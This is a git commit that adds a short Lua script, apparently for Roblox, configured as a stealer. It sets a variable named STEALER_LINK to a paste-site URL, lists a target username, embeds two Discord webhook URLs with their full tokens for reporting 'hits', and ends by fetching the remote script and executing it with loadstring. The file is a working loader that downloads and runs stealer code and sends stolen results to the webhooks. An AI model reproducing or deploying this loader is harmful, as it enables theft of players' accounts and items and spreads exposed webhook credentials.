c7d345400bd1e0f3d66edf81d013726b13ba5726
w2uller <slyzzlenda@gmail.com>
2025-02-07 01:52:29 -0300

    Create nullX.lua

---
+++ nullX.lua
@@ -0,0 +1,11 @@
+STEALER_LINK = 'https://dpaste.com/EUS7RPWFD.txt'
+
+Usernames = {
+    'rip_fellindinv', 
+
+}
+
+BigHitsWebhook = "https://discord.com/api/webhooks/1337236007413878876/8K8z0Y2lcuEC_eXeDjQjhGjbvKdBu4FzoFqg0dkmeLoryCWTeAdTY6pHTI4wgUnNimkm"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1337236007413878876/8K8z0Y2lcuEC_eXeDjQjhGjbvKdBu4FzoFqg0dkmeLoryCWTeAdTY6pHTI4wgUnNimkm"
+
+loadstring(game:HttpGet(STEALER_LINK, true))()
